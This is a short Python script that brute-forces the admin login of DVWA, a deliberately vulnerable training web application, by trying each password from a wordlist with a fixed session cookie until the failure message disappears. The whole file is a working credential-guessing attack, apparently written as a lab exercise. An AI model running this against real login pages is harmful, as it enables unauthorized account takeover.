import requests

passwords_list = []
with open('passwords.txt', 'r') as f:
    passwords_list = f.read().splitlines()

for password in passwords_list:
    payload = {'username': 'admin', 'password': password, 'Login': 'Login'}
    cookie = {'security': 'low', 'PHPSESSID': '193u4um3nqs02bvv5fustfuedr'}
    r = requests.get(f'http://dvwa.local/vulnerabilities/brute/?username=admin&password={password}&Login=Login', data=payload, cookies=cookie)
    if 'Username and/or password incorrect.' not in r.text:
        print('Password found: ' + password)
        break
